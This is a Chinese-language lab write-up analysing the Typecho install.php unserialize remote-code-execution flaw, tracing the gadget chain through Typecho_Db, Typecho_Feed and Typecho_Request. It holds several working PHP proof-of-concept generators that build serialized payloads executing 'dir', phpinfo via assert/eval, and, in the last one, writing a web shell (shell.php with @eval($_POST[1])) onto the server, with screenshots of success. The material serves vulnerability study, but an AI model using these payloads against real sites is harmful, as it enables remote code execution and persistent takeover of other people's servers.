# 影响版本

2017年10月24日之前的所有版本

我这里用的是Typecho 1.0(14.10.10)

# 环境搭建

php的版本我用的是5.4.45

https://github.com/typecho/typecho/releases

去随便找一个2017.10.24之前发布的版本

访问/admin/开始安装

![image-20210813123935419](images/1.png)

密码我就设为123456就行

![image-20210813124010456](images/2.png)

这里会有个无法连接数据库

安装时会报错，因为无法自动创建数据库，需要使用`CREATE DATABASE typecho default charset utf8;`语句手动创建数据库

然后在安装

![image-20210813124147661](images/3.png)

# 漏洞分析

漏洞入口点在install.php

开头给出了判断,需要get一个finish参数并且带上相同IP的Referer不然就会exit

![image-20210813124715429](images/4.png)

接下来看反序列化点230行

![image-20210813125304325](images/5.png)

跟进get函数

![image-20210814103538913](images/6.png)

这里的`$key`其实就是__typecho_config

我们可以通过post一个参数`$key`来控制`$value`的值,只要`$value`不是一个数组,那么三目运算符就会返回$value的值

delete函数

![image-20210814104110509](images/7.png)

我们并没有设置一个cookie,所以这里会直接return

回到install.php

```
$db = new Typecho_Db($config['adapter'], $config['prefix']);
```

这里的`$config['adapter'], $config['prefix']`但是刚才反序列化得到的$config数组的值,是可控的

跟进一下Typecho_Db类

![image-20210814104557746](images/8.png)

这里有一个字符串拼接,那就可以调用__toString()魔术方法

再看$adapterName,这是刚才实例化传进来的值,

全局搜索__toString(),定位到了

```
typecho\var\Typecho\Feed.php
```

那我们就可以array('adapter'=>new Typecho_Feed(),"prefix"=>随便填)

```
public function __toString()
    {
        $result = '<?xml version="1.0" encoding="' . $this->_charset . '"?>' . self::EOL;

        if (self::RSS1 == $this->_type) {
            $result .= '<rdf:RDF
xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
xmlns="http://purl.org/rss/1.0/"
xmlns:dc="http://purl.org/dc/elements/1.1/">' . self::EOL;

            $content = '';
            $links = array();
            $lastUpdate = 0;

            foreach ($this->_items as $item) {
                $content .= '<item rdf:about="' . $item['link'] . '">' . self::EOL;
                $content .= '<title>' . htmlspecialchars($item['title']) . '</title>' . self::EOL;
                $content .= '<link>' . $item['link'] . '</link>' . self::EOL;
                $content .= '<dc:date>' . $this->dateFormat($item['date']) . '</dc:date>' . self::EOL;
                $content .= '<description>' . strip_tags($item['content']) . '</description>' . self::EOL;
                if (!empty($item['suffix'])) {
                    $content .= $item['suffix'];
                }
                $content .= '</item>' . self::EOL;

                $links[] = $item['link'];

                if ($item['date'] > $lastUpdate) {
                    $lastUpdate = $item['date'];
                }
            }

            $result .= '<channel rdf:about="' . $this->_feedUrl . '">
<title>' . htmlspecialchars($this->_title) . '</title>
<link>' . $this->_baseUrl . '</link>
<description>' . htmlspecialchars($this->_subTitle) . '</description>
<items>
<rdf:Seq>' . self::EOL;

            foreach ($links as $link) {
                $result .= '<rdf:li resource="' . $link . '"/>' . self::EOL;
            }

            $result .= '</rdf:Seq>
</items>
</channel>' . self::EOL;

            $result .= $content . '</rdf:RDF>';

        } else if (self::RSS2 == $this->_type) {
            $result .= '<rss version="2.0"
xmlns:content="http://purl.org/rss/1.0/modules/content/"
xmlns:dc="http://purl.org/dc/elements/1.1/"
xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
xmlns:atom="http://www.w3.org/2005/Atom"
xmlns:wfw="http://wellformedweb.org/CommentAPI/">
<channel>' . self::EOL;

            $content = '';
            $lastUpdate = 0;

            foreach ($this->_items as $item) {
                $content .= '<item>' . self::EOL;
                $content .= '<title>' . htmlspecialchars($item['title']) . '</title>' . self::EOL;
                $content .= '<link>' . $item['link'] . '</link>' . self::EOL;
                $content .= '<guid>' . $item['link'] . '</guid>' . self::EOL;
                $content .= '<pubDate>' . $this->dateFormat($item['date']) . '</pubDate>' . self::EOL;
                $content .= '<dc:creator>' . htmlspecialchars($item['author']->screenName) . '</dc:creator>' . self::EOL;

                if (!empty($item['category']) && is_array($item['category'])) {
                    foreach ($item['category'] as $category) {
                        $content .= '<category><![CDATA[' . $category['name'] . ']]></category>' . self::EOL;
                    }
                }

                if (!empty($item['excerpt'])) {
                    $content .= '<description><![CDATA[' . strip_tags($item['excerpt']) . ']]></description>' . self::EOL;
                }

                if (!empty($item['content'])) {
                    $content .= '<content:encoded xml:lang="' . $this->_lang . '"><![CDATA['
                    . self::EOL .
                    $item['content'] . self::EOL .
                    ']]></content:encoded>' . self::EOL;
                }

                if (isset($item['comments']) && strlen($item['comments']) > 0) {
                    $content .= '<slash:comments>' . $item['comments'] . '</slash:comments>' . self::EOL;
                }

                $content .= '<comments>' . $item['link'] . '#comments</comments>' . self::EOL;
                if (!empty($item['commentsFeedUrl'])) {
                    $content .= '<wfw:commentRss>' . $item['commentsFeedUrl'] . '</wfw:commentRss>' . self::EOL;
                }

                if (!empty($item['suffix'])) {
                    $content .= $item['suffix'];
                }

                $content .= '</item>' . self::EOL;

                if ($item['date'] > $lastUpdate) {
                    $lastUpdate = $item['date'];
                }
            }
```

这里还有一个判断

![image-20210814112401817](images/9.png)

![image-20210814112556672](images/10.png)

我们用的是290这个地方,这里的$this->_type=RSS 2.0

在290行的地方

![image-20210814105519324](images/11.png)

有一个`$item['author']->screenName`

定义类的时候,帮$item定义为了私有变量

![image-20210814105621632](images/12.png)

这里是可控的了

这里控制的时候要注意一下,前面有个foreach函数

`$this->_items`本身就是一个数组,取里面的值给了`$item`,我们需要的还是$item数组里面的author

所以$this->_items应该是一个二维数组才对

没找到这个函数,那如果要继续调用下去就只能是找属性了,那看看有没有可用的__get(),当调用一个不存在的属性时,会触发这个函数

全局搜索__get,定位到了

```
typecho\var\Typecho\Request.php
```

![image-20210814110644140](images/13.png)

跟进get()函数

![image-20210814110711517](images/14.png)

跟进_applyFilter()

![image-20210814110836004](images/15.png)

存在危险函数call_user_func()

`$this->_filter`是可控的,那$this->_filter[0]='system'

再看$value

回溯get()

![image-20210814111334374](images/16.png)

`$value`的值是通过`$this->_params[$key]`来的,这个是可控的,此时的$key是screenName

# 漏洞复现

poc

```
<?php
class Typecho_Request
{
    private $_filter=[];
    private $_params=[];
    public function __construct()
    {
        $this->_filter[]='system';
        $this->_params=["screenName"=>"dir"];
    }
}
class Typecho_Feed
{
    const RSS2 = 'RSS 2.0';
    private $_type;
    private $_items=array();
    public function __construct()
    {
        $this->_type = self::RSS2;
        $this->_items=array(array("author"=>new Typecho_Request()));

    }
}
$config=array("adapter"=>new Typecho_Feed(),"prefix"=>'dawnt0wn');
echo base64_encode(serialize($config));
?>
```

但是返回了500

![image-20210814115639993](images/17.png)

在网上搜索后才知道在Db.php中对反序列化的内容抛出了异常导致了报错

![image-20210814120054566](images/18.png)

抛出了一个Typecho_Db_Exception异常

在common.php中

![image-20210814120626764](images/19.png)

有一个`@ob_end_clean();`这个会清理缓冲

其实在install.php最开始就调用了ob_start()

![image-20210814121156058](images/20.png)

在文档中的讲解如下

![image-20210814121254087](images/21.png)

但是我们进行注入的代码触发了他原本的exception,最后会执行ob_end_clean()来清理缓冲

这样的话我们需要想办法，使得代码不会执行到exception，这样原本的缓冲区数据就会被输出出来。

我看seebug上的作者给了两种解决方案

1、因为`call_user_func`函数处是一个循环，我们可以通过设置数组来控制第二次执行的函数，然后找一处exit跳出，缓冲区中的数据就会被输出出来。

2、第二个办法就是在命令执行之后，想办法造成一个报错，语句报错就会强制停止，这样缓冲区中的数据仍然会被输出出来。

暂时知道有两种方法来输出payload的结果：
1）提前exit程序，让程序不运行到抛出异常处
2）提前将缓冲区内容打印到页面上

所以我就简单粗暴地把exit放在了payload里面

poc

```
<?php
class Typecho_Request
{
    private $_filter=[];
    private $_params=[];
    public function __construct()
    {
        $this->_filter[]='assert';
        $this->_params=["screenName"=>"eval('phpinfo();exit;')"];
    }
}
class Typecho_Feed
{
    const RSS2 = 'RSS 2.0';
    private $_type;
    private $_items=array();
    public function __construct()
    {
        $this->_type = self::RSS2;
        $this->_items=array(array("author"=>new Typecho_Request()));

    }
}
$config=array("adapter"=>new Typecho_Feed(),"prefix"=>'dawnt0wn');
echo base64_encode(serialize($config));
?>
```

![image-20210814124552246](images/22.png)

如果嫌报错有点多了的话,这里可以这么写

```
$this->_items = array(
				array(
					"title" => "test",
					"link" => "test",
					"data" => "20190430",
					"author" => new Typecho_Request(),
				),
			);
```

另外给出网上的poc

```
<?php
class Typecho_Request
{
    private $_params = array();
    private $_filter = array();

    public function __construct()
    {
        // $this->_params['screenName'] = 'whoami';
        $this->_params['screenName'] = -1;
        $this->_filter[0] = 'phpinfo';
    }
}

class Typecho_Feed
{
    const RSS2 = 'RSS 2.0';
    /** 定义ATOM 1.0类型 */
    const ATOM1 = 'ATOM 1.0';
    /** 定义RSS时间格式 */
    const DATE_RFC822 = 'r';
    /** 定义ATOM时间格式 */
    const DATE_W3CDTF = 'c';
    /** 定义行结束符 */
    const EOL = "\n";
    private $_type;
    private $_items = array();
    public $dateFormat;

    public function __construct()
    {
        $this->_type = self::RSS2;
        $item['link'] = '1';
        $item['title'] = '2';
        $item['date'] = 1507720298;
        $item['author'] = new Typecho_Request();
        $item['category'] = array(new Typecho_Request());

        $this->_items[0] = $item;
    }
}

$x = new Typecho_Feed();
$a = array(
    'host' => 'localhost',
    'user' => 'xxxxxx',
    'charset' => 'utf8',
    'port' => '3306',
    'database' => 'typecho',
    'adapter' => $x,
    'prefix' => 'typecho_'
);
echo urlencode(base64_encode(serialize($a)));
?>
```

其实可以不用这么做,他虽然返回了500,但是程序已经是执行了,我们可以getshell

我这里就直接搬运大佬的poc了

```
<?php
class Typecho_Request
{
    private $_filter = array();
    private $_params = array();
    public function __construct(){
        $this->_filter[0] = 'assert';
        $this->_params['screenName'] = 'file_put_contents("shell.php", "<?php @eval(\$_POST[1]); ?>")';
    }
}
class Typecho_Feed
{
    const RSS2 = 'RSS 2.0';
    private $_type;
    private $_items = array();
    public function __construct(){
        $this->_type = self::RSS2;
        $this->_items[0] = array(
            'author' => new Typecho_Request(),
        );
    }
}
$final = new Typecho_Feed();
$poc = array(
    'adapter' => $final,
    'prefix' => 'typecho_'
);
echo urlencode(base64_encode(serialize($poc)));
?>

```

![image-20210814130458049](images/23.png)

返回了500，但是我的shell还是成功地写入了

![image-20210814130802883](images/24.png)

参考链接

https://xz.aliyun.com/t/9428#toc-3

https://paper.seebug.org/424/

https://www.cnblogs.com/litlife/p/10798061.html

http://47.100.93.13/index.php/archives/827/

